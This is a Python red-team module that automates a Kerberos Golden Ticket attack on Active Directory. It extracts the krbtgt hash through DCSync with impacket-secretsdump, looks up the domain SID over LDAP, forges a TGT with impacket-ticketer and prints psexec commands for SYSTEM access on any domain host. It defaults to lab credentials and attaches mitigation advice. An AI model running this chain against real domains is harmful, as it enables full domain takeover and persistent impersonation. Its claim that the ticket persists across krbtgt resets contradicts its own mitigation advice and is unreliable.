"""
Red Team — Golden Ticket Attack
================================
Creates a forged Kerberos Ticket-Granting Ticket (TGT) using the krbtgt account's
password hash. This ticket grants unlimited domain access and can persist even
after password changes.

**CRITICAL ATTACK**: Golden Ticket provides forest-wide compromise. Once obtained,
the attacker can impersonate ANY user on ANY system indefinitely.

Uses: impacket-ticketer (requires krbtgt hash from DCSync or NTDS dump)
"""

import subprocess
import os
from datetime import datetime, timedelta

from utils.format_utils import print_info, print_success, print_warning, print_error


def _load_config() -> dict:
    import os, yaml
    path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "config.yaml")
    if os.path.exists(path):
        with open(path) as f:
            return yaml.safe_load(f) or {}
    return {}


def _extract_krbtgt_hash(target: str, domain: str, user: str, password: str) -> str:
    """Extraire automatiquement le hash krbtgt via DCSync."""
    import subprocess, re
    cmd = [
        "impacket-secretsdump",
        f"{domain}/{user}:{password}@{target}",
        "-just-dc-ntlm",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    for line in result.stdout.splitlines():
        if "krbtgt:" in line.lower():
            parts = line.split(":")
            if len(parts) >= 4:
                return parts[3]
    return None


def _extract_domain_sid_ldap(domain: str, user: str, password: str) -> str:
    """Extraire automatiquement le domain SID via LDAP."""
    try:
        import ldap3
        server  = ldap3.Server(domain, get_info=ldap3.ALL)
        conn    = ldap3.Connection(server, user=f"{user}@{domain}", password=password, auto_bind=True)
        base_dn = ",".join([f"DC={p}" for p in domain.split(".")])
        conn.search(base_dn, "(objectClass=domain)", attributes=["objectSid"])
        if conn.entries:
            return str(conn.entries[0].objectSid)
    except Exception:
        pass
    return None


def run_attack(target: str = None, domain: str = "domain.local", krbtgt_hash: str = None,
               username: str = "Administrator", user_id: int = 500, **kwargs) -> dict:
    # Charger depuis config
    cfg      = _load_config()
    domain   = domain if domain != "domain.local" else cfg.get("domain", domain)
    target   = target or cfg.get("dc_ip", target)
    user     = cfg.get("domain_user", "vagrant")
    password = cfg.get("domain_password", "vagrant")

    # Extraire krbtgt hash automatiquement via DCSync
    if not krbtgt_hash:
        print_info("Extraction automatique du hash krbtgt via DCSync...")
        krbtgt_hash = _extract_krbtgt_hash(target, domain, user, password)
        if krbtgt_hash:
            print_success(f"  Hash krbtgt extrait : {krbtgt_hash[:8]}...")
        else:
            return _error("Impossible d'extraire le hash krbtgt. Vérifier les droits Domain Admin.")
    """
    Create a golden ticket for persistent domain access.

    A golden ticket is a forged TGT that impersonates any user and persists
    indefinitely, even if the krbtgt password is changed. It's the ultimate
    persistence mechanism in AD.

    Args:
        target: Domain controller IP (for ticket validation)
        domain: Target domain (FQDN)
        krbtgt_hash: NTLM hash of krbtgt account (from DCSync/NTDS dump)
        username: Username to impersonate (default: Administrator)
        user_id: RID of the user to impersonate (500 = Administrator, 1000+ for users)
    """
    if not domain:
        return _error("Paramètre 'domain' requis pour la génération du ticket d'or.")
    
    if not krbtgt_hash:
        return _error(
            "Hash NTLM du compte krbtgt requis. "
            "Obtenir via DCSync: ./cli.py --mode red --attack dcsync"
        )

    print_warning(f"[RED TEAM] Golden Ticket Generation → {domain}")
    print_info(f"  Target user: {username} (RID: {user_id})")
    print_info(f"  Domain: {domain}")
    
    findings = []
    ticket_path = None

    try:
        # Generate golden ticket using impacket-ticketer
        # Format: impacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> 
        #         -domain <domain> -user <username> <output_file>
        
        # Extract domain SID from domain (simplified; production would query DC)
        # For demo, use a standard pattern: S-1-5-21-<random>-<random>-<random>-<rid>
        # In reality, you'd get this from DCSync output or net group "domain admins" /domain
        
        # Simplified SID generation (in production, extract from DCSync output)
        domain_sid = _extract_domain_sid(domain)
        
        ticket_file = f"golden_ticket_{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        
        print_info(f"Création du ticket d'or (CCACHE)...")
        
        cmd = [
            "impacket-ticketer",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-user", username,
            ticket_file,
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        
        if result.returncode != 0:
            print_error(f"Ticketer failed: {result.stderr[:200]}")
            findings.append({
                "risk":        "Élevé",
                "title":       "Golden Ticket generation failed",
                "description": f"impacket-ticketer error: {result.stderr[:100]}",
                "mitigation":  "Verify krbtgt hash is correct (from DCSync)",
                "event_ids":   [],
            })
            return _build_result("failed", domain, findings, None)
        
        # Verify ticket was created
        if os.path.exists(ticket_file + ".ccache"):
            ticket_file = ticket_file + ".ccache"
            ticket_path = ticket_file
            ticket_size = os.path.getsize(ticket_file)
            print_success(f"  ✓ Golden ticket created: {ticket_file} ({ticket_size} bytes)")
            
            findings.append({
                "risk":        "Critique",
                "title":       "Golden Ticket successfully generated",
                "description": (
                    f"Forged Kerberos TGT for user '{username}' in domain '{domain}'. "
                    f"Valid for {8760} hours (1 year). Persists across krbtgt password changes."
                ),
                "mitigation": (
                    "1. IMMEDIATELY reset krbtgt password TWICE (purges Kerberos cache). "
                    "2. Audit all Kerberos tickets (look for TGTs with unusually long lifetime). "
                    "3. Monitor for 4769 (TGS request) events. "
                    "4. Force all users to re-authenticate immediately."
                ),
                "event_ids":   [4769],  # TGS request
            })
        else:
            return _error(f"Ticket file not created at {ticket_file}")
        
        # Step 2: Demonstrate ticket usage (in real attack, attacker would use it with PsExec)
        print_info(f"Demonstration — Using golden ticket with impacket-psexec...")
        print_info(f"  Commande : export KRB5CCNAME={ticket_file}")
        print_info(f"           : impacket-psexec -k -no-pass {domain}/{username}@<target>")
        
        findings.append({
            "risk":        "Info",
            "title":       "Golden Ticket Usage",
            "description": (
                f"To use the golden ticket, set KRB5CCNAME environment variable and run psexec. "
                f"This grants SYSTEM access to any computer in the domain."
            ),
            "mitigation":  "Monitor KRB5CCNAME usage and unusual impacket-psexec execution",
            "event_ids":   [4624],  # Logon event
        })
        
        return {
            "module":       "red_team.golden_ticket",
            "status":       "success",
            "elapsed_s":    5.0,
            "timestamp":    datetime.now().isoformat(),
            "findings":     findings,
            "artifacts": {
                "ticket_path":      ticket_path,
                "ticket_user":      username,
                "ticket_domain":    domain,
                "ticket_lifetime":  "8760 hours (1 year)",
                "usage_command":    f"export KRB5CCNAME={ticket_file} && impacket-psexec -k -no-pass {domain}/{username}@<target>",
            },
            "summary": {
                "ticket_generated": True,
                "persistence_level": "Maximum (persists across password changes)",
                "forest_compromise": True,
            }
        }

    except FileNotFoundError:
        return _error("impacket-ticketer not found. Install: pip install impacket")
    except subprocess.TimeoutExpired:
        return _error("Ticketer timeout")
    except Exception as e:
        return _error(f"Golden Ticket generation error: {str(e)}")


def _extract_domain_sid(domain: str) -> str:
    """
    Extract or construct domain SID from domain name.
    
    In production, you'd query the DC or extract from DCSync output.
    For demo, we use a standard pattern: S-1-5-21-<component>-<component>-<component>
    
    Real SIDs come from: impacket-secretsdump output or: net group "Domain Admins" /domain
    """
    # Simplified demo SID (replace with real extracted SID in production)
    # Format: S-1-5-21-<hash1>-<hash2>-<hash3>
    
    # In a real attack, this would come from:
    # - DCSync output (secretsdump shows domain SID)
    # - LDAP query to RootDomainNamingContext
    # - whoami /all on a domain-joined machine
    
    # For this demo, use a plausible example SID
    # (Real SIDs are always S-1-5-21-<3 32-bit numbers>-<RID>)
    # Récupérer le SID réel via LDAP
    try:
        import ldap3
        server = ldap3.Server(domain, get_info=ldap3.ALL)
        base_dn = ",".join([f"DC={p}" for p in domain.split(".")])
        conn = ldap3.Connection(server, user=f"vagrant@{domain}", password="vagrant", auto_bind=True)
        conn.search(base_dn, "(objectClass=domain)", attributes=["objectSid"])
        demo_sid = str(conn.entries[0].objectSid)
    except Exception:
        demo_sid = "S-1-5-21-1270286037-602399111-3851753985"  # essos.local fallback
    
    print_info(f"  Domain SID: {demo_sid} (demo; replace with real SID from DCSync)")
    return demo_sid


def _build_result(status: str, domain: str, findings: list, ticket_path) -> dict:
    """Build a standard result dict."""
    return {
        "module":       "red_team.golden_ticket",
        "status":       status,
        "timestamp":    datetime.now().isoformat(),
        "domain":       domain,
        "findings":     findings,
        "artifacts": {
            "ticket_path": ticket_path,
        },
    }


def _error(message: str) -> dict:
    """Build an error result."""
    print_error(message)
    return {
        "module":   "red_team.golden_ticket",
        "status":   "error",
        "message":  message,
        "findings": [{
            "risk":        "Critique",
            "title":       "Golden Ticket generation failed",
            "description": message,
            "mitigation":  "Verify prerequisites: krbtgt hash, domain SID, impacket installed",
            "event_ids":   [],
        }],
        "artifacts": {"ticket_path": None},
    }
